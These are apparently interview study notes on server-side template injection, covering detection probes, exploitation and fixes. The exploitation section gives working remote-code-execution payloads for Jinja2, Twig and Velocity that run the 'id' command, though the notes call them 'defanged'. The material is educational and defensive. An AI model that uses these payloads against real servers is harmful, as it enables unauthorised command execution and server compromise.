## 🛡️ Interview Notes: What Is SSTI?

### What is SSTI?

- **Server-Side Template Injection (SSTI)** occurs when user input is **unsafely embedded into server-side templates**, allowing attackers to inject and execute arbitrary code or expressions.
- It affects template engines like:
    - **Jinja2** (Python), **Twig** (PHP), **Velocity** (Java), **Freemarker**, **Smarty**, etc.
- Impacts range from:
    - Information disclosure
    - Arbitrary code execution (RCE)
    - Full server compromise

---

### 🧪 How to Detect/Exploit SSTI

#### 🔍 Detection

- Inject common template expressions and look for evaluation:
    - `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
- If the output is `49`, the input is being evaluated by the template engine.

#### 💥 Exploitation (Defanged Examples)

**Jinja2 (Python):**

Jinja

{{ config.items() }}  

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}  

Show more lines

**Twig (PHP):**

Twig

{{ system('id') }}  

Show more lines

**Velocity (Java):**

Apache Velocity

#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()  

Show more lines

> ⚠️ These are defanged and for educational use only. Never test without authorization.

#### 🧰 Tools

- **Burp Suite**, **tplmap**, or custom fuzzers
- Manual testing with payloads in parameters, headers, or body

---

### 🛡️ How to Fix SSTI

- **Never concatenate user input directly into templates**.
- Use **template engine context separation**:
    - Pass only safe, pre-validated variables
- Disable or restrict dangerous functions (e.g., `eval`, `exec`, `popen`)
- Use **auto-escaping** features of the template engine
- Apply **input validation and output encoding**
- Monitor for unusual template rendering behavior or errors